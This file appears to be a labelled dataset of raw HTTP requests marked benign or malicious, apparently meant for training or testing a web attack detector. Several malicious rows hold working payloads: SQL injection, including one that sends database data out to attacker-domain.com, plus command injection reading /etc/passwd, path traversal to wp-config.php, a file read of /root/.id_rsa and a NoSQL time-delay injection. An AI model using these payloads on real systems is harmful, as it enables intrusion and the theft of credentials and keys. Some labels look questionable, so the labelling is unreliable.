label,text
benign,"POST /api/photos/upload-avatar HTTP/1.1
Host: community-photo-share.club
User-Agent: Python-urllib/3.9
Accept: */*
Content-Type: multipart/form-data; boundary=----FormBoundaryA9Lq72IqhJsfFJGu
Content-Length: 460
Connection: keep-alive
Cookie: sessionid=9f3b775e1186e987cb61cfdc307a5b48

------FormBoundaryA9Lq72IqhJsfFJGu
Content-Disposition: form-data; name=""caption""

Casual selfie from weekend
------FormBoundaryA9Lq72IqhJsfFJGu
Content-Disposition: form-data; name=""image_file""; filename=""selfie_weekend.jpg""
Content-Type: image/jpeg

(simulated binary image data)
------FormBoundaryA9Lq72IqhJsfFJGu--"
benign,"GET /api/v2/reports/daily?date=2024-06-15 HTTP/1.1
Host: analytics-dashboard.coop:7070
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3MiOiJpbnRlcm5hbCJ9.dwQMq7OnFcKPKHGbn1wzoqIy0wQbN3lh1y1iYlRWv7k
User-Agent: python-requests/2.28.2
Connection: close"
benign,"GET /music/playlists/2024-hot-hits HTTP/1.1
Host: streambeat-music.net
Connection: keep-alive
Accept: audio/mpeg, audio/*; q=0.9, */*; q=0.8
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate
Referer: https://streambeat-music.net/home
User-Agent: Mozilla/5.0 (iPod touch; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1"
benign,"GET /img/loading_animated.gif HTTP/1.1
Host: green-garden-marketplace.biz
Accept: image/gif,image/*,*/*;q=0.5
Referer: https://green-garden-marketplace.biz/cart
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Via: 1.1 vegur
Connection: close"
malicious,"GET /xml_api/search_books?book_title=Harry%20Potter%27%20or%20%271%27%3D%271 HTTP/1.1
Host: library-archive-services.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"PUT /api/user/957/profile HTTP/1.1
Host: digital-photo-sharing.club
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: */*
Content-Type: application/json
Content-Length: 102
Via: 1.1 photo-crawler
Connection: close

{""userProfile"": {""bioInfo"": ""Photo lover &amp; editor &lt;i&gt;sharing moments&lt;/i&gt; worldwide.""}}"
benign,"GET /images/logo.svg HTTP/1.1
Host: digital-marketing-insights.io
User-Agent: python-requests/2.28.2
Accept: image/svg+xml,image/*,*/*;q=0.9
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /media/podcasts/episode-154-interview-with-ceo.mp3 HTTP/1.1
Host: podcast-haven.info
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: audio/mpeg,audio/*;q=0.9,*/*;q=0.8
If-Modified-Since: Tue, 11 Apr 2023 08:45:00 GMT
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9"
benign,"GET /img/campaign/landing/hero-background_2400x900.png HTTP/1.1
Host: marketing-cloud-buzz.net
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://marketing-cloud-buzz.net/campaigns/summer-hits
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
Connection: keep-alive"
benign,"PATCH /api/v1/articles/1345 HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer sfdsk3920dfjs9fjiewr98f7b3
Content-Type: application/json-patch+json
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Connection: keep-alive

[
  {""op"": ""replace"", ""path"": ""/title"", ""value"": ""Improving User Engagement with New Features""},
  {""op"": ""add"", ""path"": ""/tags/-"", ""value"": ""user-experience""}
]"
benign,"POST /api/register HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Accept: application/json
Origin: https://secure-user-portal.net
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Content-Length: 168

{""name"":""Javier Mendez"",""email"":""javier.mendez@secure-user-portal.net"",""password"":""Nq84^vh1qR"",""referralCode"":""FRIEND22"",""termsAccepted"":true}"
benign,"GET /favicon.ico HTTP/1.1
Host: my-personal-blog-site.info
Accept: image/x-icon,image/vnd.microsoft.icon
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Mobile Safari/537.36
Connection: close
Accept-Language: en-US,en;q=0.7"
benign,"PUT /api/data/item123 HTTP/1.1
Host: notifications-alerts.cloud-sync.net
User-Agent: Bingbot/2.0
Accept: */*
Content-Type: text/plain
Content-Length: 27
X-Forwarded-For: 203.0.113.54
Connection: close

System notification status ok."
benign,"POST /subscribe/journal HTTP/1.1
Host: futuretech-insider.biz
User-Agent: Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Accept-Language: en-GB,en;q=0.7
Pragma: no-cache
Referer: https://futuretech-insider.biz/media/articles
Connection: keep-alive

email=elena.smith%40ftinsider.biz"
benign,"POST /transaction/process HTTP/1.1
Host: payments-finance-solutions.biz
Authorization: Bearer 0d8c3fa7-cb3b-439a-9e9b-4219354ffa3f
Content-Type: application/json
Content-Length: 94
Idempotency-Key: f7d4b66e-1784-48a8-9d1a-e844b17c3493
X-Request-ID: c43e1f89-6cf7-4e48-86b8-a2a6ebf1b623
X-Client-Version: 2.9.5
Accept: application/json
Connection: close

{""accountId"":78910,""amount"":150.75,""currency"":""USD"",""transactionType"":""transfer"",""notes"":""Monthly subscription""}"
benign,"DELETE /services/marketing/campaigns/77ea45 HTTP/1.1
Host: api.marketing-insights.ai
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Mobile Safari/537.36
Accept: application/json, text/plain
Connection: keep-alive"
benign,"GET /topic/technews-updates HTTP/1.1
Host: nextwave-discussions.ai
Connection: keep-alive
Accept: text/html
Referer: https://nextwave-discussions.ai/home
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9; last_visit=1685742000
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
benign,"GET /gallery/photos?album=summer_vacation&year=2023&resolution=1080p&sort=upload_date_desc&include_favorites=true&filter_location=hawaii&min_likes=100&max_likes=1000&page=3&per_page=30&format=jpeg HTTP/1.1
Host: vibrant-views-photo.co
Cache-Control: max-age=0
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
malicious,"GET /product/42' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a, (SELECT @@version), 0x3a, FLOOR(RAND(0)*2)) x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) a) -- HTTP/1.1
Host: api.marketplace-hub.net
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Referer: https://www.marketplace-hub.net/home"
benign,"PUT /api/v1/projects/4321 HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJh...token123
Content-Type: application/xml
Accept: application/xml
DNT: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0
Content-Length: 134

<?xml version=""1.0"" encoding=""UTF-8""?>
<project>
  <name>OpenWorld RPG</name>
  <status>development</status>
  <team_lead>Alex Fremont</team_lead>
</project>"
malicious,"GET /admin/run_backup_script.sh?host=10.0.0.15%3B%20cat%20%2Fetc%2Fpasswd HTTP/1.1
Host: secure-file-storage.io
User-Agent: curl/7.77.0
Accept: */*
Connection: close"
malicious,"GET /download?res=..%c0%af..%c0%af..%c0%afwp-config.php HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://my-personal-blog-site.info/editor
Connection: keep-alive"
benign,"POST /api/tasks HTTP/1.1
Host: team-workflow-cloud.io
Authorization: Bearer dXJuOjEyMzQ1Njc4OQ==
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15
Accept-Language: en-US,en;q=0.9

{""title"":""Finalize Project Report"",""dueDate"":""2024-07-15T17:00:00Z"",""assignedTo"":""user_8892"",""priority"":""high"",""completed"":false}"
benign,"GET /robots.txt HTTP/1.1
Host: archivesecurecloud.io
User-Agent: SiteAuditBot/2.1
Accept-Encoding: identity
Accept-Language: en-US,en;q=0.9
Connection: close"
malicious,"GET /app/user/settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
X-Security-Override: true
Cookie: session_id=9f8a7b6c5d4e3f2a1b0c"
benign,"GET /blog/post/read?id=847&title=Nature%27s+beauty+%26+serenity+in+photos HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive"
benign,"GET /forum/topics?query=how%20to%20bake%20bread HTTP/1.1
Host: community-kitchen-talk.net
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.129 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.8
Referer: https://community-kitchen-talk.net/
Connection: keep-alive
Cookie: sessionId=2b1f9a87c7214d3b8c756572;"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: python-requests/2.31.0
Accept: application/json
Content-Type: application/json-patch+json
Origin: https://my-personal-blog-site.info
X-Requested-With: XMLHttpRequest
Content-Length: 61

[
  {""op"": ""replace"", ""path"": ""/editor/theme"", ""value"": ""light""}
]"
benign,"GET /user/profile/view?id=1024&tab=activity HTTP/1.1
Host: secure-user-portal.net
Connection: keep-alive
Accept: application/json, text/javascript, */*; q=0.01
X-CSRF-Token: lc2R7S9zKhrAmD5fQ93DoE1xGLv6ZgYMTM9b4aWc
Cookie: sessionid=7f64f488a3a1298c5b19c745d14ca1fe; preferences=lang=en; theme=dark
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko
Accept-Language: en-US,en;q=0.5
Cache-Control: max-age=0"
benign,"POST /api/v1/orders/create HTTP/1.1
Host: order-management-system.cloud
Content-Type: application/xml
Content-Length: 136
Accept: application/xml, text/xml
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Connection: keep-alive

<order>
  <customer>Linda Barrett</customer>
  <productID>5698</productID>
  <quantity>2</quantity>
  <priority>standard</priority>
</order>"
benign,"PUT /user-data/backup/94f812b33a7f HTTP/1.1
Host: backup-cloud-service.ai
Content-Type: application/octet-stream
Content-Length: 197
Accept-Encoding: gzip, deflate
User-Agent: python-requests/2.28.1
X-Forwarded-For: 192.168.10.15
Authorization: Token 62fbe1e344bfcd773a81f0f64a9da737
Pragma: no-cache
Connection: keep-alive

UEsDBBQACAAIAMZY2lQAAAAAAAAAAAAAAAAFAAALdGV4dC9UYXNrLTEuanNvblVUCQADRp0CzmYdAs
AAAgAAAAAAABQSwcIeXz5GYYAAAAMAAA=="
benign,"POST /posts/new HTTP/1.1
Host: open-webdev-community.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Content-Length: 181
Cache-Control: max-age=0

forum_post=When+embedding+JavaScript+in+HTML%2C+do+you+usually+wrap+functions+like+function%28%29+{+console.log%28%27Hello%27%29+}%3F+Also+does+the+%3Ca+href%3D%22%23%22%3Elink%3C%2Fa%3E+need+escaping%3F"
benign,"OPTIONS /user/profile/edit HTTP/1.1
Host: identity.auth-management.biz
Origin: https://portal.ecommerce-central.net
Access-Control-Request-Method: POST
Access-Control-Request-Headers: authorization, content-type
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
Accept: application/json
Connection: keep-alive"
malicious,"GET /load/file%3A%2F%2F%2Froot%2F.id_rsa HTTP/1.1
Host: api-secure-reports.enterprise-data.ai
User-Agent: Python-urllib/3.9
Accept: application/json
Referer: https://portal.enterprise-data.ai/login
Connection: keep-alive"
benign,"POST /auth/login HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Accept: application/json
Origin: https://online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.83 Mobile Safari/537.36
Content-Length: 78

{""email"":""michael.sanders1979@online-retail-store.biz"",""password"":""FlowerPot!75""}"
benign,"GET /app/user/settings HTTP/1.1
Host: cloud-sync-service.ai
Connection: keep-alive
Accept: application/json
Cookie: connect.sid=5978fhgdfh98wuer; last_login=2024-06-05T13:56:22Z; prefs=darkmode,true
DNT: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.124 Safari/537.36"
benign,"GET /events/schedule/week42 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml
DNT: 1
Referer: https://community.game-dev-forum.org/
Cache-Control: no-cache
Connection: keep-alive"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: backend-secureservice.internal.supplychain
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5 Build/RQ3A.210705.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/json
Accept: application/json
Content-Length: 67
Connection: keep-alive

{""filters"":{""category"":""electronics"",""availability"":""in_stock""},""page"":1}"
benign,"POST /api/log HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36
Content-Type: application/json
Accept: application/json
Content-Length: 412
Origin: https://online-retail-store.biz

{""activity"":""purchase"",""order"":{""id"":""ORD2456789"",""items"":[{""productId"":""prod_3492"",""quantity"":2,""details"":{""color"":""black"",""size"":""M""}},{""productId"":""prod_1209"",""quantity"":1,""details"":{""color"":""red"",""warranty"":""2 years""}}],""totalAmount"":145.90,""paymentMethod"":""credit_card""},""user"":{""userId"":""cust78910"",""loyaltyPoints"":420},""timestamp"":""2024-06-01T13:22:45Z""}"
benign,"OPTIONS /api/v4/user/238711/preferences HTTP/1.1
Host: preferences-api.socialmedia-platform.net
Origin: https://app.socialmedia-client.org
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type, x-custom-header, x-api-key
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: */*
Referer: https://app.socialmedia-client.org/home
Connection: keep-alive"
malicious,"GET /app/user/settings?profile=%2527%2520OR%2520%28SELECT%2520LOAD_FILE%28CONCAT%28%2527%255C%255C%255C%255C%27%2C%28SELECT%2520version%28%29%29%2C%2527.attacker-domain.com%255C%255Cdata%2527%29%29%29--%2520 HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: */*
Accept-Language: en-US
Connection: keep-alive
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiamFuZSIsImlhdCI6MTYxNzY3NDAwMH0.XtzQ43Rl6iYk1az1eDXE15oFRTTcUkDZMx2j6yhePiE"
benign,"OPTIONS /api/v1/catalog/products HTTP/1.1
Host: online-retail-store.biz
Origin: https://shopper-interface.net
Access-Control-Request-Method: GET
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0
Access-Control-Request-Headers: Authorization
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
benign,"GET /assets/js/main.9f7c3a2e.js HTTP/1.1
Host: online-retail-store.biz
Accept: */*
Referer: https://online-retail-store.biz/products/electronics/laptops
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 5 Build/SQ3A.220705.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.134 Mobile Safari/537.36
Connection: keep-alive"
benign,"GET /products;category=books/recent?sort=top&limit=20 HTTP/1.1
Host: api.libraryzone.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: application/json
Accept-Language: en-GB,en;q=0.7
X-Requested-With: XMLHttpRequest
Cache-Control: no-cache"
benign,"POST /api/xml/createOrder HTTP/1.1
Host: ecommerce-hub.biz
Authorization: Bearer abcdefghijklmnopqrstuvwxyz9876543210
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Content-Length: 310
Connection: keep-alive

<?xml version=""1.0"" encoding=""UTF-8""?>
<Order>
  <OrderID>ORD20240715001</OrderID>
  <CustomerID>CUST72819</CustomerID>
  <Items>
    <Item>
      <ProductID>1234</ProductID>
      <Quantity>2</Quantity>
      <Price>89.50</Price>
    </Item>
    <Item>
      <ProductID>5678</ProductID>
      <Quantity>1</Quantity>
      <Price>129.99</Price>
    </Item>
  </Items>
  <ShippingMethod>Express</ShippingMethod>
</Order>"
malicious,"GET /portal/settings/config HTTP/1.1
Host: userprefs-update-center.org
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: */*
Cache-Control: max-age=0
X-User-Filter: {""$where"": ""if(this.isAdmin){var d=new Date();while((new Date())-d<=5000){};}return true;""}
Connection: keep-alive"
benign,"POST /auth/login HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Accept: application/json
Origin: https://www.online-retail-store.biz
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G996U Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Mobile Safari/537.36
Content-Length: 92

{""email"":""janedoe123@online-retail-store.biz"",""password"":""Gladys!76Rpq2""}"
